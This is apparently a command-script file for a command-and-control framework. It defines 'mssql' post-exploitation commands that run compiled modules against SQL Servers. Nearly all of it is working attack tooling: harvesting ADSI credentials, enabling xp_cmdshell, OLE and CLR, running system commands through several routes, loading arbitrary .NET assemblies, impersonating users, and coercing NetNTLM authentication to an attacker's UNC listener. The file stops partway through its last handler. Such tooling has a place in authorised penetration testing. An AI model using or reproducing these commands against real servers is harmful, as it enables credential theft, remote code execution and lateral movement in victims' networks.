var _cmd_1434udp = ax.create_command("1434udp", "Obtain SQL Server connection information from 1434/UDP", "mssql 1434udp 192.168.10.10");
_cmd_1434udp.addArgString("serverIP", true, "SQL Server IP");
_cmd_1434udp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let serverIP = parsed_json["serverIP"];

    let bof_params = ax.bof_pack("cstr", [serverIP]);
    let bof_path = ax.script_dir() + "_bin/SQL/1434udp." + ax.arch(id) + ".o";
    let message = "Task: Obtain SQL Server connection information";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_adsi = ax.create_command("adsi", "Obtain ADSI creds from ADSI linked server", "mssql adsi [-p port] [-d database] [-l linkedserver] [-i impersonate] [server] [adsiserver]");
_cmd_adsi.addArgFlagInt("-p",    "port",         "Optional: ADSI port", 0);
_cmd_adsi.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_adsi.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_adsi.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_adsi.addArgString("server",      true, "SQL server to connect to");
_cmd_adsi.addArgString("adsiserver",  true, "ADSI linked server name or address");
_cmd_adsi.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let adsiserver   = parsed_json["adsiserver"];
    let port         = parsed_json["port"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,int", [server, database, linkedserver, impersonate, adsiserver, port] );
    let bof_path = ax.script_dir() + "_bin/SQL/adsi." + ax.arch(id) + ".o";
    let message = "Task: Obtain ADSI credentials";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_agentcmd = ax.create_command("agentcmd", "Execute a system command using agent jobs", "mssql agentcmd [-d database] [-l linkedserver] [-i impersonate] [server] [command]");
_cmd_agentcmd.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_agentcmd.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_agentcmd.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_agentcmd.addArgString("server",      true, "SQL server to connect to");
_cmd_agentcmd.addArgString("command",     true, "System command to execute via agent job");
_cmd_agentcmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let command      = parsed_json["command"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, command] );
    let bof_path = ax.script_dir() + "_bin/SQL/agentcmd." + ax.arch(id) + ".o";
    let message = "Task: Execute system command via SQL Agent";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_agentstatus = ax.create_command("agentstatus", "Enumerate SQL Agent status and jobs", "mssql agentstatus [-d database] [-l linkedserver] [-i impersonate] [server]");
_cmd_agentstatus.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_agentstatus.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_agentstatus.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_agentstatus.addArgString("server", true, "SQL server to connect to");
_cmd_agentstatus.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate] );
    let bof_path = ax.script_dir() + "_bin/SQL/agentstatus." + ax.arch(id) + ".o";
    let message = "Task: Enumerate SQL Agent status and jobs";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_checkrpc = ax.create_command("checkrpc", "Enumerate RPC status of linked servers", "mssql checkrpc [-d database] [-l linkedserver] [-i impersonate] [server]");
_cmd_checkrpc.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_checkrpc.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_checkrpc.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_checkrpc.addArgString("server", true, "SQL server to connect to");
_cmd_checkrpc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate] );
    let bof_path = ax.script_dir() + "_bin/SQL/checkrpc." + ax.arch(id) + ".o";
    let message = "Task: Enumerate RPC status on linked servers";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_clr = ax.create_command("clr", "Load and execute a .NET assembly in a stored procedure", "mssql clr -h [hash] [-d database] [-l linkedserver] [-i impersonate] [server] [dll_path] [function]");
_cmd_clr.addArgFlagString("-h", "hash",         "Required: SHA-512 hash of DLL", "");
_cmd_clr.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_clr.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_clr.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_clr.addArgString("server",   true, "SQL server to connect to");
_cmd_clr.addArgString("dll_path", true, "Path to .NET assembly DLL");
_cmd_clr.addArgString("function", true, "Entry-point function name");
_cmd_clr.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let dllPath      = parsed_json["dll_path"];
    let functionName = parsed_json["function"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];
    let userHash     = parsed_json["hash"];

    let base64Data = ax.file_read(dllPath);

    if(base64Data.length === 0) {
        throw new Error(`file ${dllPath} not readed`);
    }

    let binaryString = "";

    try {
        let b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
        base64Data = base64Data.replace(/[^A-Za-z0-9\+\/\=]/g, "");

        for(let i = 0; i < base64Data.length; i += 4) {
            let e1 = b64.indexOf(base64Data.charAt(i));
            let e2 = b64.indexOf(base64Data.charAt(i + 1));
            let e3 = b64.indexOf(base64Data.charAt(i + 2));
            let e4 = b64.indexOf(base64Data.charAt(i + 3));

            let c1 = (e1 << 2) | (e2 >> 4);
            let c2 = ((e2 & 15) << 4) | (e3 >> 2);
            let c3 = ((e3 & 3) << 6) | e4;

            binaryString += String.fromCharCode(c1);
            if(e3 !== 64) binaryString += String.fromCharCode(c2);
            if(e4 !== 64) binaryString += String.fromCharCode(c3);
        }
    } catch(e) {
        throw new Error(`Base64 decode failed: ${e.message}`);
    }

    // Convert binary to hex
    let hexString = "";
    for(let i = 0; i < binaryString.length; i++) {
        let byte = binaryString.charCodeAt(i) & 0xFF;
        let hex = byte.toString(16);
        hexString += (hex.length === 1 ? '0' + hex : hex).toUpperCase();
    }

    // Validate DLL header
    if(hexString.substring(0, 4) !== "4D5A") {
        throw new Error(`Invalid DLL header: got ${hexString.substring(0, 4)}`);
    }


    if(!userHash || userHash.length === 0) {
        throw new Error("SHA-512 hash is required. Use -h flag to specify the hash.");
    }

    let dllHash = userHash.toUpperCase();

    // Pack all as cstr (7 strings, NO bytes type)
    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr,cstr,cstr",
        [server, database, linkedserver, impersonate, functionName, dllHash, hexString]);
    let bof_path = ax.script_dir() + "_bin/SQL/clr." + ax.arch(id) + ".o";
    let message = "Task: execute CLR assembly " + ax.file_basename(dllPath);

    ax.execute_alias(id, cmdline, `execute bof ${bof_path} ${bof_params}`, message);
});




var _cmd_columns = ax.create_command("columns", "Enumerate columns within a table", "mssql columns [-d database] [-l linkedserver] [-i impersonate] [server] [table]");
_cmd_columns.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_columns.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_columns.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_columns.addArgString("server", true, "SQL server to connect to");
_cmd_columns.addArgString("table",  true, "Table to enumerate columns from");
_cmd_columns.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let table        = parsed_json["table"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr", [server, database, table, linkedserver, impersonate] );
    let bof_path = ax.script_dir() + "_bin/SQL/columns." + ax.arch(id) + ".o";
    let message = "Task: Enumerate columns in table";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_databases = ax.create_command("databases", "Enumerate SQL databases", "mssql databases [-d database] [-l linkedserver] [-i impersonate] [server]");
_cmd_databases.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_databases.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_databases.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_databases.addArgString("server", true, "SQL server to connect to");
_cmd_databases.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate]);
    let bof_path = ax.script_dir() + "_bin/SQL/databases." + ax.arch(id) + ".o";
    let message = "Task: SQL Server whoami BOF";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_disableclr = ax.create_command("disableclr", "Disable CLR integration", "mssql disableclr [-d database] [-l linkedserver] [-i impersonate] [server]");
_cmd_disableclr.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_disableclr.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_disableclr.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_disableclr.addArgString("server", true, "SQL server to connect to");
_cmd_disableclr.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "clr enabled", "0"] );
    let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
    let message = "Task: Disable CLR integration";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_disableole = ax.create_command("disableole", "Disable OLE Automation Procedures", "mssql disableole [-d database] [-l linkedserver] [-i impersonate] [server]");
_cmd_disableole.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_disableole.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_disableole.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_disableole.addArgString("server", true, "SQL server to connect to");
_cmd_disableole.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "Ole Automation Procedures", "0"] );
    let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
    let message = "Task: Disable OLE Automation";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_disablerpc = ax.create_command("disablerpc", "Disable RPC and RPC out on a linked server", "mssql disablerpc [-d database] [-i impersonate] [server] [linkedserver]");
_cmd_disablerpc.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_disablerpc.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_disablerpc.addArgString("server", true, "SQL server to connect to");
_cmd_disablerpc.addArgString("linkedserver", true, "Linked server name");
_cmd_disablerpc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let linkedserver = parsed_json["linkedserver"];
    let database     = parsed_json["database"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "rpc", "FALSE"] );
    let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
    let message = "Task: Disable RPC on linked server";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_disablexp = ax.create_command("disablexp", "Disable xp_cmdshell", "mssql disablexp [-d database] [-l linkedserver] [-i impersonate] [server]");
_cmd_disablexp.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_disablexp.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_disablexp.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_disablexp.addArgString("server", true, "SQL server to connect to");
_cmd_disablexp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "xp_cmdshell", "0"] );
    let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
    let message = "Task: Disable xp_cmdshell";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_enableclr = ax.create_command("enableclr", "Enable CLR integration", "mssql enableclr [-d database] [-l linkedserver] [-i impersonate] [server]");
_cmd_enableclr.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_enableclr.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_enableclr.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_enableclr.addArgString("server", true, "SQL server to connect to");
_cmd_enableclr.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "clr enabled", "1"] );
    let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
    let message = "Task: Enable CLR integration";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_enableole = ax.create_command("enableole", "Enable OLE Automation Procedures", "mssql enableole [-d database] [-l linkedserver] [-i impersonate] [server]");
_cmd_enableole.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_enableole.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_enableole.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_enableole.addArgString("server", true, "SQL server to connect to");
_cmd_enableole.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "Ole Automation Procedures", "1"] );
    let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
    let message = "Task: Enable OLE Automation Procedures";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_enablerpc = ax.create_command("enablerpc", "Enable RPC and RPC out on a linked server", "mssql enablerpc [-d database] [-i impersonate] [server] [linkedserver]");
_cmd_enablerpc.addArgFlagString("-d", "database",    "Optional: Database to use", "");
_cmd_enablerpc.addArgFlagString("-i", "impersonate", "Optional: User to impersonate during execution", "");
_cmd_enablerpc.addArgString("server",       true, "SQL server to connect to");
_cmd_enablerpc.addArgString("linkedserver", true, "Linked server name");
_cmd_enablerpc.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server      = parsed_json["server"];
    let linkedserver= parsed_json["linkedserver"];
    let database    = parsed_json["database"];
    let impersonate = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "rpc", "TRUE"] );
    let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
    let message = "Task: Enable RPC on linked server";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_enablexp = ax.create_command("enablexp", "Enable xp_cmdshell", "mssql enablexp [-d database] [-l linkedserver] [-i impersonate] [server]");
_cmd_enablexp.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_enablexp.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_enablexp.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_enablexp.addArgString("server", true, "SQL server to connect to");
_cmd_enablexp.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, "xp_cmdshell", "1"] );
    let bof_path = ax.script_dir() + "_bin/SQL/togglemodule." + ax.arch(id) + ".o";
    let message = "Task: Enable xp_cmdshell";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_impersonate = ax.create_command("impersonate", "Enumerate users that can be impersonated", "mssql impersonate [-d database] [server]");
_cmd_impersonate.addArgFlagString("-d", "database", "Optional: Database to use", "");
_cmd_impersonate.addArgString("server", true, "SQL server to connect to");
_cmd_impersonate.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server   = parsed_json["server"];
    let database = parsed_json["database"];

    let bof_params = ax.bof_pack("cstr,cstr", [server, database]);
    let bof_path = ax.script_dir() + "_bin/SQL/impersonate." + ax.arch(id) + ".o";
    let message = "Task: SQL Server impersonation enumeration";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_info = ax.create_command("info", "Gather information about the SQL Server", "mssql info [-d database] [server]");
_cmd_info.addArgFlagString("-d", "database", "Optional: Database to use", "");
_cmd_info.addArgString("server", true, "SQL server to connect to");
_cmd_info.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server   = parsed_json["server"];
    let database = parsed_json["database"];

    let bof_params = ax.bof_pack("cstr,cstr", [server, database]);
    let bof_path = ax.script_dir() + "_bin/SQL/info." + ax.arch(id) + ".o";
    let message = "Task: SQL Server impersonation enumeration";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_links = ax.create_command("links", "Enumerate linked servers", "mssql links [-d database] [-l linkedserver] [-i impersonate] [server]");
_cmd_links.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_links.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_links.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_links.addArgString("server", true, "SQL server to connect to");
_cmd_links.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate] );
    let bof_path = ax.script_dir() + "_bin/SQL/links." + ax.arch(id) + ".o";
    let message = "Task: Enumerate linked servers";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_olecmd = ax.create_command("olecmd", "Execute a system command using OLE automation procedures", "mssql olecmd [-d database] [-l linkedserver] [-i impersonate] [server] [command]");
_cmd_olecmd.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_olecmd.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_olecmd.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_olecmd.addArgString("server",  true, "SQL server to connect to");
_cmd_olecmd.addArgString("command", true, "System command to execute via OLE automation");
_cmd_olecmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let command      = parsed_json["command"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, command] );
    let bof_path = ax.script_dir() + "_bin/SQL/olecmd." + ax.arch(id) + ".o";
    let message = "Task: Execute command via OLE automation";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_query = ax.create_command("query", "Execute a custom SQL query", "mssql query [-d database] [-l linkedserver] [-i impersonate] [server] [query]");
_cmd_query.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_query.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_query.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_query.addArgString("server", true, "SQL server to connect to");
_cmd_query.addArgString("query",  true, "Query to execute");
_cmd_query.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let query        = parsed_json["query"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, query]);
    let bof_path = ax.script_dir() + "_bin/SQL/query." + ax.arch(id) + ".o";
    let message = "Task: SQL Server custom query execution";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_rows = ax.create_command("rows", "Get the count of rows in a table", "mssql rows [-d database] [-l linkedserver] [-i impersonate] [server] [table]");
_cmd_rows.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_rows.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_rows.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_rows.addArgString("server", true, "SQL server to connect to");
_cmd_rows.addArgString("table",  true, "Table to count rows from");
_cmd_rows.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let table        = parsed_json["table"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr", [server, database, table, linkedserver, impersonate] );
    let bof_path = ax.script_dir() + "_bin/SQL/rows." + ax.arch(id) + ".o";
    let message =  "Task: Count rows in table";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_search = ax.create_command("search","Search a table for a column name","mssql search [-d database] [-l linkedserver] [-i impersonate] [server] [keyword]");
_cmd_search.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_search.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_search.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_search.addArgString("server",  true, "SQL server to connect to");
_cmd_search.addArgString("keyword", true, "Column name keyword to search for");
_cmd_search.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let keyword      = parsed_json["keyword"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, keyword] );
    let bof_path = ax.script_dir() + "_bin/SQL/search." + ax.arch(id) + ".o";
    let message =  "Task: Search for column names";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_smb = ax.create_command("smb", "Coerce NetNTLM auth via xp_dirtree", "mssql smb [-d database] [-l linkedserver] [-i impersonate] [server] [\\\\listener]");
_cmd_smb.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_smb.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_smb.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_smb.addArgString("server",   true, "SQL server to connect to");
_cmd_smb.addArgString("listener", true, "UNC path listener (e.g., \\\\host\\share)");
_cmd_smb.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let listener = parsed_json["listener"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate, listener] );
    let bof_path = ax.script_dir() + "_bin/SQL/smb." + ax.arch(id) + ".o";
    let message = "Task: SQL Server SMB relay via xp_dirtree";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_tables = ax.create_command("tables", "Enumerate tables within a database", "mssql tables [-d database] [-l linkedserver] [-i impersonate] [server]");
_cmd_tables.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_tables.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_tables.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_tables.addArgString("server", true, "SQL server to connect to");
_cmd_tables.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate] );
    let bof_path = ax.script_dir() + "_bin/SQL/tables." + ax.arch(id) + ".o";
    let message = "Task: Enumerate Tables";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_users = ax.create_command("users", "Enumerate users with database access","mssql users [-d database] [-l linkedserver] [-i impersonate] [server]");
_cmd_users.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_users.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_users.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_users.addArgString("server", true, "SQL server to connect to");
_cmd_users.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack( "cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate] );
    let bof_path = ax.script_dir() + "_bin/SQL/users." + ax.arch(id) + ".o";
    let message = "Task: Enumerate users with database access";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_whoami = ax.create_command("whoami", "Gather logged in user, mapped user and roles from SQL server", "mssql whoami [-d database] [-l linkedserver] [-i impersonate] [server]");
_cmd_whoami.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_whoami.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_whoami.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_whoami.addArgString("server", true, "SQL server to connect to");
_cmd_whoami.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

    let bof_params = ax.bof_pack("cstr,cstr,cstr,cstr", [server, database, linkedserver, impersonate]);
    let bof_path = ax.script_dir() + "_bin/SQL/whoami." + ax.arch(id) + ".o";
    let message = "Task: SQL Server whoami BOF";

    ax.execute_alias( id, cmdline, `execute bof ${bof_path} ${bof_params}`, message );
});



var _cmd_xpcmd = ax.create_command("xpcmd", "Execute a system command via xp_cmdshell", "mssql xpcmd [-d database] [-l linkedserver] [-i impersonate] [server] [command]");
_cmd_xpcmd.addArgFlagString("-d", "database",     "Optional: Database to use", "");
_cmd_xpcmd.addArgFlagString("-l", "linkedserver", "Optional: Execute through linked server", "");
_cmd_xpcmd.addArgFlagString("-i", "impersonate",  "Optional: User to impersonate during execution", "");
_cmd_xpcmd.addArgString("server",  true, "SQL server to connect to");
_cmd_xpcmd.addArgString("command", true, "Command to execute via xp_cmdshell");
_cmd_xpcmd.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let server       = parsed_json["server"];
    let command      = parsed_json["command"];
    let database     = parsed_json["database"];
    let linkedserver = parsed_json["linkedserver"];
    let impersonate  = parsed_json["impersonate"];

